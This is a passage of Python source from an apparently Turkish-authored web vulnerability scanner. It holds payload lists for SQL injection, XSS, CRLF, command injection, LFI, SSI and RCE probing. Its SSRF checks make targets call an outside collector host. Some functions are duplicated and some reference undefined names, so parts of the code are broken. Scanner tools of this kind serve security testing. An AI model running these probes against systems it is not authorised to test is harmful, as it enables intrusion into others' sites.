		    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"

		try:

		    urlac = session.get(dizin)
		    response = urlac.text
		    data = dump.dump_all(urlac)
		    rawdata = data.decode('utf-8')

		    if "<title>index of" in response or \
					   "directory listing for" in response or \
		       "<title>folder listing" in response  or \
		       "<table summary=\"directory listing" in response or  \
					   "browsing directory" in response or  \
		       "[to parent directory]" in response:
			self.ekle("GET",url,"Index Off", dizin,rawdata)
			# elif "<%" in response and "%>" in response:
			#    return True,url+" ASP Code",response

		except:
		    b="daaf"





	except:
	    mesaj="Error"





    def getrce(self,url):
	rceler = ["#print(int)0xFFF123-1",
		          "+#print(int)0xFFF123-1;//",
		  "'+#print(int)0xFFF123-1+'",
		  "\"+#print(int)0xFFF123-1+",
		          "<? #print(int)0xFFF123-1; ?>",
		  "<?php #print(int)0xFFF123-1; ?>",
		  "<?php print(int)0xFFF123-1; ?>",
		  "<? #print(int)0xFFF123-1;//?>",
		  "{php}#print(int)0xFFF123-1;{/php}",
		  "'{${#print(int)0xFFF123-1}}'",
		  "[php]#print(int)0xFFF123-1;[/php]",
		  "#print 0xFFF123-1",
		          "eval('#print 0xFFF123-1')",
		          "'+#print 0xFFF123-1+'",
		  "\"+#print 0xFFF123-1+",
		  "${@#print(0xFFF123-1);}"]

	for remotecommand in rceler:

	    try:
		for key,value in parse_qs(urlparse.urlparse(url).query, True).items():

		    rcehal={}
		    rcehal[key]=remotecommand

		    urlac = session.get(url+"?"+rcehal)

		    data = dump.dump_all(urlac)
		    rawdata = data.decode('utf-8')
		    response = urlac.text

		    if "167734101" in response:
			self.ekle("GET",url,"Remote Command Execution",rcehal, rawdata)

	    except:
		mesaj="Error"




    def phpexec(self,url):

	seperators = ["a;env","a);env","/e\0"]


	for sep in seperators:
	    try:
		for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
		    phpexechal={}
		    phpexechal[key]=sep

		    urlac = session.get(url+"?"+phpexechal)
		    data = dump.dump_all(urlac)
		    rawdata = data.decode('utf-8')
		    response = urlac.text
		    self.hatakontrol("GET",url,rawdata,url)

	    except:
		mesaj="Error"



    def lfitara(self,lfibul):


	lfiyollar=["data:;base64,MHg5NDExMTEx","data://text/plain;base64,MHg5NDExMTEx=","data:;base64,MHg5NFNjYW5uZXIxMTEx"]

	protocol=urlparse.urlparse(lfibul).scheme+"://"
	host=urlparse.urlparse(lfibul).netloc
	dosya=urlparse.urlparse(lfibul).path

	for lfidizin in lfiyollar:
	    try:

		lfilihal={}


		for key,value in parse_qs(urlparse.urlparse(lfibul).query, True).items():
		    lfilihal[key]=lfidizin

		    try:
			r =session.get(protocol+host+dosya+"?"+lfilihal)
			response=r.text
			if "0x9411111" in response or "0x94Scanner1111" in response:
			    data = dump.dump_all(r)
			    rawdata=data.decode('utf-8')
			    self.ekle("GET", lfibul, "Local File Include Base64",protocol + host + dosya + "?" + lfilihal, rawdata)
		    except:
			err="err"

	    except:
		err="err2"


    def lfitest(self,lfiurl):

	try:
	    urlnormal=lfiurl.replace("=", "=0x94buradaydi.txt")
	    urlac = session.get(urlnormal)
	    response = urlac.text
	    data = dump.dump_all(urlac)
	    rawdata = data.decode('utf-8')

	    if "failed to open stream" in response or "java.io.FileNotFoundException" in response or "java.lang.IllegalArgumentException" in response or "java.net.MalformedURLException" in response or  "open_basedir restriction in effect" in response:

		self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)


	    elif "Microsoft VBScript runtime error" in response and "File not found" in response:

		self.ekle("GET",lfiurl,"Local File Include",urlnormal, rawdata)

	except:
	    mesaj="Error"







    def postget(self, url, params, method):

	postgetdict = {}
	postgetdict = params.copy()

	try:
	    for key, value in params.items():
		if key in postgetdict:
		    postgetdict[key] = value + "'"

	    if method == "GET":
		f = session.get(url + "?" + postgetdict)
		data = dump.dump_all(f)
		rawdata = data.decode('utf-8')
	    else:
		f = session.post(url, postgetdict)
		data = dump.dump_all(f)
		rawdata = data.decode('utf-8')
	    self.hatakontrol("GET", url, rawdata, url)

	except:
	    mesaj = "fff"

    def header_injection(self,url):


	injectionkod = ["'","'a","() { :;};",'")))']

	for inj in injectionkod:
	    try:
		hinfo = ""
		if "https://" in url:
		    conn = httplib.HTTPSConnection(urlparse.urlparse(url).hostname)
		else:
		    conn = httplib.HTTPConnection(urlparse.urlparse(url).hostname)

		getlink = url.replace(urlparse.urlparse(url).hostname, "")
		getlink2 = getlink.replace("http://", "").replace("https://", "")

		conn.putrequest("GET", getlink2.replace(":80", "").replace(":443", ""))

		conn.putheader('UserAgent', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)+' + inj)
		conn.putheader('Referer', url + inj)
		conn.putheader('Cookie', inj)
		conn.putheader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' + inj)
		conn.putheader('Accept-Language', 'en-us,en;q=0.5' + inj)
		conn.putheader('Accept-Encoding', 'gzip, deflate' + inj)
		conn.putheader('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7' + inj)
		conn.endheaders()
		r1 = conn.getresponse()
		crlfresponsek = r1.read()
		self.hatakontrol("HEADER",url,crlfresponsek,url)

	    except:
		mesaj = "Error"


    def headercrlf(self,link):

	injectionkod=["%0d%0a%20ScannerXXX%3aScannerXXX",
		              "%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a%3Chtml%3E%3Cfont color=red%3E0x94scanner%3C/font%3E%3C/html%3E",
		      "%0d%0aLocation:%20https://github.com/antichown/0x94TR/blob/master/remote_test.txt",
		      "%0d%0aScannerXXX%3aScannerXXX%3dScannerXXX~3",
		              "%0D%0aLocation: javascript:%0D%0A%0D%0A<script>alert(0x000123)</script>"]

	for inj in injectionkod:
	    try:
		hinfo="";
		if "https://" in link:
		    conn = httplib.HTTPSConnection(urlparse.urlparse(link).hostname)
		else:
		    conn = httplib.HTTPConnection(urlparse.urlparse(link).hostname)

		getlink=link.replace(urlparse.urlparse(link).hostname,"")
		getlink2=getlink.replace("http://","").replace("https://","")

		conn.putrequest("GET", getlink2.replace(":80","").replace(":443","")+inj)

		conn.putheader('UserAgent','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)+'+inj)
		conn.putheader('Referer',link+inj)
		conn.putheader('Cookie',inj)
		conn.putheader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'+inj)
		conn.putheader('Accept-Language','en-us,en;q=0.5'+inj)
		conn.putheader('Accept-Encoding', 'gzip, deflate'+inj)
		conn.putheader('Accept-Charset','ISO-8859-1,utf-8;q=0.7,*;q=0.7'+inj)
		conn.putheader('0x94Scannerheader',"0x94Scannerheader")

		conn.endheaders()

		r1 = conn.getresponse()
		crlfresponsek=r1.read()

		for x,y in r1.getheaders():
		    hinfo+=x+y
		    if "0x94Scannerheader" in x or "ScannerXXX" in x:
			self.ekle("GET", link, "New Line Header CRLF Injection", inj, crlfresponsek)


		if "0x000123" in crlfresponsek:
		    self.ekle("GET",link,"Response Header CRLF Injection",inj, crlfresponsek)


		if "Warning: Header may not contain" in crlfresponsek or \
				   "header, new line detected" in crlfresponsek:
		    self.ekle("GET",link,"New Line Header CRLF Injection",inj, crlfresponsek)



		if "4ed7c9f4b716d75bdca5b42975774e55" in crlfresponsek:
		    self.ekle("GET",link,"Location Header CRLF Injection",inj, crlfresponsek)


		elif "0x94scanner" in crlfresponsek and \
				     "Content-Type:" not in crlfresponsek:
		    self.ekle("GET",link,"Header CRLF Injection",inj, crlfresponsek)

	    except:
		mesaj="Error"



    def getcommandinj(self,url):

	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
	cmdhal={}
	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]

	for sep in seperators:
	    for safcmd in command:
		try:
		    for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
			cmdhal={}
			cmdhal[key]=sep+safcmd
		    urlac = session.get(url+"?"+cmdhal)
		    response = urlac.text
		    cmdhal.clear()
		    data = dump.dump_all(urlac)
		    rawdata = data.decode('utf-8')
		    if "12345669" in response  or "16773409" in response:
			self.ekle("GET",url,"Command Injection",cmdhal, rawdata)


		except:
		    mesaj="Error"
		cmdhal.clear()
		
		
		
    def getcommandinj(self,url):

	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]
	cmdhal={}
	command=["SET /A 0xFFF123-2","expr 12345671 - 2"]

	for sep in seperators:
	    for safcmd in command:
		try:
		    for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
			cmdhal={}
			cmdhal[key]=sep+safcmd
		    urlac = session.get(url+"?"+cmdhal)
		    response = urlac.text
		    cmdhal.clear()
		    data = dump.dump_all(urlac)
		    rawdata = data.decode('utf-8')
		    if "12345669" in response  or "16773409" in response:
			self.ekle("GET",url,"Command Injection",cmdhal, rawdata)


		except:
		    mesaj="Error"
		cmdhal.clear()    



    def ssrf_form(self,url,params,method):

	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
	
	
	anahtar=randomString(19)
	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
	
	
	postgetdict={}
	postgetdict=params.copy()

	for framefull in frameler:
	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict={}
		    postgetdict[key]=value+framefull+anahtar_ana
		    new_param = {}
		    new_param = postgetdict.copy()
		    try:
			if method=="GET":
			    y11 = session.get(url+"?"+postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    bakbak=requests.get("https://0x94.000webhostapp.com/0x94.txt").text
			    if anahtar in bakbak:	
				self.ekle(method,url,"GET SSRF Injection",str(new_param), rawdata)
				    



			else:
			    y11 = session.post(url, postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			    bakbak=requests.get("https://0x94.000webhostapp.com/0x94.txt").text
			    if anahtar in bakbak:	
				self.ekle(method,url,"POST SSRF Injection",str(new_param), rawdata)


		    except:
			mesaj="Bilinmeyen hata olustu\n"

		    postgetdict.clear()
		    postgetdict = params.copy()

    def ssrf_blind(self,gelenurl):

	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";","@","&","?@"]
	cmdhal={}

	anahtar=randomString(19)
	anahtar_ana="https://0x94.000webhostapp.com/0x94.php?"+anahtar
	
	for sep in seperators:
	    try:
		for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
		    cmdhal={}
		    cmdhal[key]=sep+anahtar_ana
		urlac = session.get(url+"?"+cmdhal)
		response = urlac.text
		cmdhal.clear()
		data = dump.dump_all(urlac)
		rawdata = data.decode('utf-8')
		bakbak=requests.get("https://0x94.000webhostapp.com/0x94.txt").text
		
		if anahtar in bakbak:
		    self.ekle("GET",url,"URL SSRF Injection",cmdhal, rawdata)

	    except:
		mesaj="Error"
	    cmdhal.clear()   


   
    
    def sql(self,urlnormal):

	sqlt = ["'", "\"", "\xBF'\"(", "(", ")"]
	for sqlpay in sqlt:
	    try:
		urlnormal=urlnormal.replace("=", "="+sqlpay)
		urlac = session.get(urlnormal)
		response = urlac.text
		data = dump.dump_all(urlac)
		rawdata = data.decode('utf-8')
		self.hatakontrol("GET",urlnormal,urlnormal+"Payload="+sqlpay,rawdata)

	    except:
		mesaj="Error"



    def requestim(self,URL):
	user_agent = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10' }
	req = urllib2.Request(URL, None, user_agent)
	try:
	    request = session.get(req)

	except:
	    mesaj="hata"

	return len(request.text)

    def vuln_check(self,URL):
	global TrueResponse
	TrueResponse = int(self.requestim(URL + '%20AND%2043%20like%2043--+'))
	FalseResponse = int(self.requestim(URL + '%20AND%2034%20like%2043--+'))

	if(TrueResponse != FalseResponse):
	    return 'boolean'
	else:
	    start = time.time()
	    SleepResponse = self.requestim(URL + '%20and%20sleep(5)--+')
	    elapsed_time = (time.time() - start)

	    if(elapsed_time > 5):
		return 'time'

    def temizle(self,source):

	yenisource=source.replace("<script","")
	yenisource1=re.sub(r"\"(.*?)\"|'(.*?)'","",yenisource)
	return yenisource1

    def blind_dogrula(self,url):
	try:
	    true_dogru = " AND 3*2*1=6 AND 132=132"
	    false_dogru = " AND 3*2*1=6 AND 132=133"
	    source1  = session.get(url + true_dogru)

	    source2  = session.get(url + false_dogru)

	    if len(source1.text) != len(source2.text):
		return True,len(source1.text), len(source2.text)
	except:
	    a="xxx"

	return False,0,0



    def blind(self,urlblind):

	try:
	    linknormal = session.get(urlblind)

	    true_strings = [" and 1=1", " AND 3*2*1=6", " and 1 like 1", " aNd 5=5", "aaa", "' AND 3*2*1=6"]
	    false_strings = [" and 1=2", " AND 3*2*1=7", " and 1 like 2", " aNd 5=7", "bbb", "' AND 3*2*1=7'"]
	    i = 0

	    while i < len(true_strings) - 1:
		try:
		    sonuc = session.get(urlblind + true_strings[i])
		    response1 = sonuc.text
		except:
		    mesaj = "errr"
		try:
		    sonuc = session.get(urlblind + false_strings[i])
		    response2 = sonuc.text

		except:
		    mesaj = "entry"

		benten,ben1, ben2 = self.blind_dogrula(urlblind)
		if benten:

		    if len(linknormal.text) == ben1:

			if len(response2) == ben2:

			    if len(response1) != len(response2):

				self.ekle("GET", urlblind, "Blind SQL Injection", urlblind+" \nTrue=" + true_strings[i] + " | FALSE=" + false_strings[i], response1)
		i += 1
	except:
	    a="err"


    def xsscalisiomu(self,kaynak):

	xssdurum=False

	bakalim=set(list(kaynak.split("\n")))

	for satir in bakalim:
	    if "\"><0x000123>" in satir:
		if "<code>" in satir or "<noscript>" in satir:
		    xssdurum=True
		else:
		    xssdurum=False

	return xssdurum

    def xsstara(self,xssurl):

	xsspayload=["\"><script>alert(0x000123)</script>",
		            "\"><sCriPt>alert(0x000123)</sCriPt>",
		    "\"; alert(0x000123)",
		    "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
		            "\"><img Src=0x94 onerror=alert(0x000123)>",
		    "\"><BODY ONLOAD=alert(0x000123)>",
		    "'%2Balert(0x000123)%2B'",
		    "\"><0x000123>",
		    "'+alert(0x000123)+'",
		            "%2Balert(0x000123)%2B'",
		            "'\"--></style></script><script>alert(0x000123)</script>",
		    "'</style></script><script>alert(0x000123)</script>",
		    "</script><script>alert(0x000123)</script>",
		   "</style></script><script>alert(0x000123)</script>",
		  "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
		  "'\"--></style></script><script>alert(0x000123)</script>",
		    "';alert(0x000123)'",
	    "<scr<script>ipt>alert(0x000123)</script>",
	    "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
	    "'){}}alert(0x000123);",
	    "');alert(0x000123)//"]

	for xssler in xsspayload:
	    try:

		urlnormal=xssurl.replace("=", "="+xssler)
		urlac = session.get(urlnormal)
		response = urlac.text
		data = dump.dump_all(urlac)
		rawdata = data.decode('utf-8')
		if "<script>alert(0x000123)" in response or \
				   "');alert(0x000123)" in response or \
		   "<sCriPt>alert(0x000123)" in response or \
		   "+alert(0x000123)+" in response or \
				   "'%2Balert(0x000123)%2B'" in response or \
		   "<BODY ONLOAD=alert(0x000123)>" in response or \
		   "<img Src=0x94 onerror=alert(0x000123)" in response:
		    xssmi=self.xsscalisiomu(response)
		    if xssmi==False:
			if "failed to open stream" not in response:
			    self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
		    else:
			if "failed to open stream" not in response:
			    self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
	    except:
		mesaj="asad"


    def xsstest(self,xsstesturl):

	try:
	    urlac = session.get(xsstesturl+"0x000123")
	    response = urlac.text

	    if "0x000123" in response:
		self.xsstara(xsstesturl)

	    else:
		self.xsstara(xsstesturl)
	except:
	    mesaj="xadaf"


    def getldapvexpath(self,url):

	injpayload = [")","^($!@$)(()))******","<!--'\"a"]


	for lxpath in injpayload:

	    try:

		urlnormal=url+urllib.urlencode(parse_qs(lxpath))
		urlac = session.get(urlnormal.replace("&",urllib.urlencode(parse_qs(lxpath)) +"&").replace(" ", "%20"))
		response = urlac.read()
		self.hatakontrol("GET",url,response,urlnormal.replace("&",urllib.urlencode(parse_qs(lxpath)) +"&").replace(" ", "%20"))


	    except:
		mesaj="mamama"
		#yaz(mesaj)


    def postget(self,url, params, method):

	postgetdict={}
	postgetdict=params.copy()


	try:
	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict[key]=value+"'"

	    if method=="GET":
		f = session.get(url+"?"+postgetdict)
		data = dump.dump_all(f)
		rawdata = data.decode('utf-8')
	    else:
		f = session.post(url, postgetdict)
		data = dump.dump_all(f)
		rawdata = data.decode('utf-8')
	    self.hatakontrol(method,url,rawdata,"postget")
	    postgetdict.clear()
	    postgetdict = params.copy()

	except:
	    mesaj="fff"
	    postgetdict.clear()
	    postgetdict = params.copy()



    def postgettek(self,url, params, method):

	postgetdict={}
	postgetdict=params.copy()



	for key,value in params.items():
	    try:
		if key in postgetdict:
		    postgetdict[key]=value+"'"

		    if method=="GET":
			f = session.get(url+"?"+postgetdict)
			data = dump.dump_all(f)
			rawdata = data.decode('utf-8')
		    else:
			f = session.post(url, postgetdict)
			data = dump.dump_all(f)
			rawdata = data.decode('utf-8')

		    self.hatakontrol(method,url,rawdata,"postgettek")
		    postgetdict.clear()
		    postgetdict=params.copy()

	    except:
		mesaj="fff"

	    postgetdict.clear()
	    postgetdict = params.copy()







    def blindpostonay(self,url,params,method):



	timesql=[" WAITFOR DELAY '0:0:50';--",
		         "'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
		 "(SELECT 1 FROM (SELECT SLEEP(50))A)",
		 "1') AND SLEEP(50) AND ('LoUL'='LoUL",
		         "' WAITFOR DELAY '0:0:50' and 'a'='a;--",
		 "' and  sleep(50) and  'a'='a",
		 "' WAITFOR DELAY '0:0:50';--",
		 "' IF 1=1 THEN dbms_lock.sleep(50);",
		 " ' IF 1=1 THEN dbms_lock.sleep(50);",
		" ' WAITFOR DELAY '0:0:50';--",
	       "; SLEEP(50)",
	       " SLEEP(50)",
		 "' SLEEP(50)--",
		 "' SLEEP(50)",
		 " pg_sleep(50)",
		 " ' pg_sleep(50)",
		 " PG_DELAY(50)",
		 " ' PG_DELAY(50)",
		 " and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
		 " ' and if(substring(user(),1,1)>=chr(97),SLEEP(50),1)--",
		 " DBMS_LOCK.SLEEP(50);",
		 " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:50'--",
		 "1,'0');waitfor delay '0:0:50;--",
		 "');waitfor delay'0:0:50';--",
		 ");waitfor delay '0:0:50';--",
		 "' and pg_sleep(50)--",
		 "1) and pg_sleep(50)--",
		 "\") and pg_sleep(50)--",
		 "') and pg_sleep(50)--",
		 "1)) and pg_sleep(50)--",
		 ")) and pg_sleep(50)--",
		 "')) and pg_sleep(50)--",
		 "\")) or pg_sleep(50)--",
		 "')) or pg_sleep(50)--",
		 "' and pg_sleep(50)--",
		 "1) and sleep(50)--",
		 "\") and sleep(50)--",
		 "') and sleep(50)--",
		 "1)) and sleep(50)--",
		 ")) and sleep(50)--",
		 "')) and sleep(50)--",
		 "\")) or sleep(50)--",
		 "' or pg_sleep(50)--",
		 "')) or sleep(50)--",
		 "1' or (sleep(19)+1) limit 1 -- ",
		 "';WAITFOR DELAY '0:0:50'--",
		  "1;WAITFOR DELAY '0:0:50'--",
		 "WAITFOR DELAY '0:0:50'--",
		 "1);WAITFOR DELAY '0:0:50'--",
		 "');WAITFOR DELAY '0:0:50'--",
		 "'));WAITFOR DELAY '0:0:50'--",
		 "1));WAITFOR DELAY '0:0:50'--",
		 "-1 AND (SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(50))-- 1",
		 "(select sleep(50))a--",
		 "(select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual)",
		 "1' || (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) || '",
		 "';SELECT pg_sleep(50)--",
		 "1;SELECT pg_sleep(50)--",
		  "SELECT pg_sleep(50)--",
		  "1);SELECT pg_sleep(50)--",
		  "');SELECT pg_sleep(50)--",
		  "'));SELECT pg_sleep(50)--",
		  "1));SELECT pg_sleep(50)--",
		  "1 + (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) + 1",
		  "(SELECT 1 FROM (SELECT SLEEP(50))A)",
		  "'+(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
		  "-1' or 1=(SELECT 1 FROM (SELECT SLEEP(50))A)+'",
		  "'%2b(select*from(select(sleep(50)))a)%2b'",
		  "-1\" or 1=(SELECT 1 FROM (SELECT SLEEP(50))A)+\""]


	postgetdict={}
	postgetdict=params.copy()

	for timeler in timesql:

	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict[key]=value+timeler
		    new_param = {}
		    new_param = postgetdict.copy()
		    try:
			if method=="GET":
			    y11 = session.get(url+"?"+postgetdict,timeout=40)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')

			else:
			    y11 = session.post(url, postgetdict,timeout=40)

			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(y11)
			    rawdata = data.decode('utf-8')
			self.hatakontrol(method,url,rawdata,url)


		    except requests.exceptions.Timeout as errt:
			self.ekle(method,url,"Timebased SQL Injection",url+"\nPayload="+str(new_param), "Timeout")


		    except socket.timeout:
			self.ekle(method,url,"Timebased SQL Injection",url+"\nPayload="+str(new_param), "Timeout")


		    except:
			mesaj="dddd"
		    postgetdict.clear()
		    postgetdict = params.copy()




    def comandinj(self,url,params,method):




	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]

	command=["SET /A 0xFFF123-2","expr 12345671 - 2","SET APPDATA"]

	postgetdict={}
	postgetdict=params.copy()

	for sep in seperators:
	    for pcmd in command:
		for key,value in params.items():
		    if key in postgetdict:
			postgetdict[key]=value+sep+pcmd
			new_param = {}
			new_param = postgetdict.copy()
			try:
			    if method=="GET":
				y11 = session.get(url+"?"+postgetdict,timeout=40)
				postgetdict.clear()
				postgetdict=params.copy()
				data = dump.dump_all(y11)
				rawdata = data.decode('utf-8')

			    else:
				y11 = session.post(url, postgetdict,timeout=40)
				postgetdict.clear()
				postgetdict=params.copy()
				data = dump.dump_all(y11)
				rawdata = data.decode('utf-8')

			    if "12345669" in y11.text or "16773409" in y11.text or "Roaming" in y11.text :
				self.ekle(method,url,"Command injection",str(new_param), rawdata)

			except:
			    mesaj="ddd"
			postgetdict.clear()
			postgetdict = params.copy()


    def postXSS(self,url,params,method):


	xsspayload=["\"><script>alert(0x000123)</script>",
		            "\"><sCriPt>alert(0x000123)</sCriPt>",
		    "\"; alert(0x000123)",
		    "\"></sCriPt><sCriPt>alert(0x000123)</sCriPt>",
		            "\"><img Src=0x94 onerror=alert(0x000123)>",
		    "\"><BODY ONLOAD=alert(0x000123)>",
		    "'%2Balert(0x000123)%2B'",
		    "\"><0x000123>",
		    "'+alert(0x000123)+'",
		   "%2Balert(0x000123)%2B'",
		  "'\"--></style></script><script>alert(0x000123)</script>",
		  "'</style></script><script>alert(0x000123)</script>",
		    "</script><script>alert(0x000123)</script>",
		"</style></script><script>alert(0x000123)</script>",
		"'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
		"'\"--></style></script><script>alert(0x000123)</script>",
		"';alert(0x000123)'",
		"<scr<script>ipt>alert(0x000123)</script>",
		"<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
		"\"<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
		"\"><scr<script>ipt>alert(0x000123)</script>",
		"\">'</style></script><script>alert(0x000123)</script>",
		"\"></script><script>alert(0x000123)</script>",
		"\"></style></script><script>alert(0x000123)</script>",
		"');alert(0x000123)//"]


	postgetdict={}
	postgetdict=params.copy()

	for xssler in xsspayload:

	    for key,value in params.items():
		if key in postgetdict:
		    postgetdict={}
		    postgetdict[key]=value+xssler
		    new_param = {}
		    new_param = postgetdict.copy()
		    try:
			if method=="GET":
			    xsspostresponse = session.get(url+"?"+postgetdict)
			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(xsspostresponse)
			    rawdata = data.decode('utf-8')

			else:

			    xsspostresponse = session.post(url, postgetdict)

			    postgetdict.clear()
			    postgetdict=params.copy()
			    data = dump.dump_all(xsspostresponse)
			    rawdata = data.decode('utf-8')

			if "<script>alert(0x000123)" in xsspostresponse.text \
						   or "');alert(0x000123)" in xsspostresponse.text \
			   or "<sCriPt>alert(0x000123)" in xsspostresponse.text \
			   or "+alert(0x000123)+" in xsspostresponse.text \
				or "'%2Balert(0x000123)%2B'" in xsspostresponse.text \
				or "<BODY ONLOAD=alert(0x000123)>" in xsspostresponse.text \
				or "<img Src=0x94 onerror=alert(0x000123)" in xsspostresponse.text:


			    xssmi=self.xsscalisiomu(xsspostresponse.text)
			    if xssmi==False:
				self.ekle(method,url,"XSS",str(new_param), rawdata)


		    except:
			mesaj="dd"

		    postgetdict.clear()
		    postgetdict = params.copy()




    def ssikontrol(self,url,params,method):

	kodum="<!--#printenv -->"
	postgetdict={}
	postgetdict=params.copy()
	for key,value in params.items():
	    if key in postgetdict:
		postgetdict[key]=value+kodum
		new_param = {}
		new_param = postgetdict.copy()
	try:
	    if method=="GET":
		ssisource = session.get(url+"?"+postgetdict)
		data = dump.dump_all(ssisource)
		rawdata = data.decode('utf-8')
	    else:
		ssisource = session.post(url, postgetdict)
		data = dump.dump_all(ssisource)
		rawdata = data.decode('utf-8')

	    if "REMOTE_ADDR" in ssisource.text  and \
			   "DATE_LOCAL" in ssisource.text and \
	       "DATE_GMT" in ssisource.text and \
	       "DOCUMENT_URI" in ssisource.text and \
			   "LAST_MODIFIED" in ssisource.text:
		self.ekle(method,url,"SSI Injection",str(new_param), rawdata)
	except:
	    mesaj="fff"
	    #yaz(mesaj)
	postgetdict.clear()
	postgetdict = params.copy()

    def blindcommand(self,url,params,method):



	seperators = ['',"'","'&", '&&', '|', ';',"\";","';","\";"]


	blindcmd=["ping -n 50 127.0.0.1","ping -c 50 127.0.0.1"]

	postgetdict={}
	postgetdict=params.copy()


	for sep in seperators:
	    for asilblind in blindcmd:
		for key,value in params.items():
		    if key in postgetdict:
			postgetdict[key]=value+sep+asilblind
			new_param = {}
			new_param = postgetdict.copy()

		try:
		    if method=="GET":
			blindcmdsource = session.get(url+"?"+postgetdict,timeout=40)
			postgetdict.clear()
			postgetdict=params.copy()
			data = dump.dump_all(blindcmdsource)
			rawdata = data.decode('utf-8')
		    else:
			blindcmdsource = session.post(url, postgetdict,timeout=40).text
			postgetdict.clear()
			postgetdict=params.copy()
			data = dump.dump_all(blindcmdsource)
			rawdata = data.decode('utf-8')

		except socket.timeout:
		    self.ekle(method,url,"Blind Command Injection",str(new_param), "ping -c 50 Timeout \n"+rawdata)


		except:
		    mesaj="Bfafag"
		    #yaz(mesaj)
		postgetdict.clear()
		postgetdict = params.copy()

    def sefurl_xss(self,xssurl):

	xsspayload = ["\"><script>alert(0x000123)</script>",
		              "\"><sCriPt>alert(0x000123)</sCriPt>",
		      "\"; alert(0x000123)",
		      "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
		      "\"><img Src=0x94 onerror=alert(0x000123)>",
		      "\"><BODY ONLOAD=alert(0x000123)>",
		      "'%2Balert(0x000123)%2B'",
		      "\"><0x000123>",
		      "'+alert(0x000123)+'",
		      "%2Balert(0x000123)%2B'",
		      "'\"--></style></script><script>alert(0x000123)</script>",
		      "'</style></script><script>alert(0x000123)</script>",
		      "</script><script>alert(0x000123)</script>",
		      "</style></script><script>alert(0x000123)</script>",
		      "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
		      "'\"--></style></script><script>alert(0x000123)</script>",
		      "';alert(0x000123)'",
		      "<scr<script>ipt>alert(0x000123)</script>",
		      "<scr<script>ipt>alert(0x000123)</scr</script>ipt>",
		      "'){}}alert(0x000123);",
		      "><script>onmouseover=0x94(0x94)",
		      "><onmouseover=0x94(0x94)",
		      "<onmouseover=0x94(0x94)",
		      "');alert(0x000123)//"]

	if (xssurl.count("/")) >= 3:
	    mxss = re.findall("(.*?)/", urlparse.urlparse(xssurl).path)
	for xyxss in mxss:
	    if xyxss:

		for xssler in xsspayload:
		    try:
			urlnormal = xssurl.replace(xyxss, xyxss + xssler)

			urlac = session.get(urlnormal)
			response = urlac.text
			data = dump.dump_all(urlac)
			rawdata = data.decode('utf-8')
			if urlac.status_code==200:
			    if "404" not in response:
				if "<script>alert(0x000123)" in response or \
								   "onmouseover=0x94" in response or \
				   "');alert(0x000123)" in response or \
				   "<sCriPt>alert(0x000123)" in response or \
					"+alert(0x000123)+" in response or \
					"'%2Balert(0x000123)%2B'" in response or \
					"<BODY ONLOAD=alert(0x000123)>" in response or \
					"<img Src=0x94 onerror=alert(0x000123)" in response:
				    xssmi = self.xsscalisiomu(response)
				    if xssmi == False:
					self.ekle("GET",xssurl,"XSS",urlnormal, rawdata)
				    else:
					self.ekle("GET", xssurl, "XSS", urlnormal, rawdata)
		    except:
			mesaj = "Bilinmeyen hata olustu\n"


    def postrce(self,url,params,method):



	rceler = ["#print(int)0xFFF123-1",
		          "+#print(int)0xFFF123-1;//",
		  "'+#print(int)0xFFF123-1+'",
		  "\"+#print(int)0xFFF123-1+",
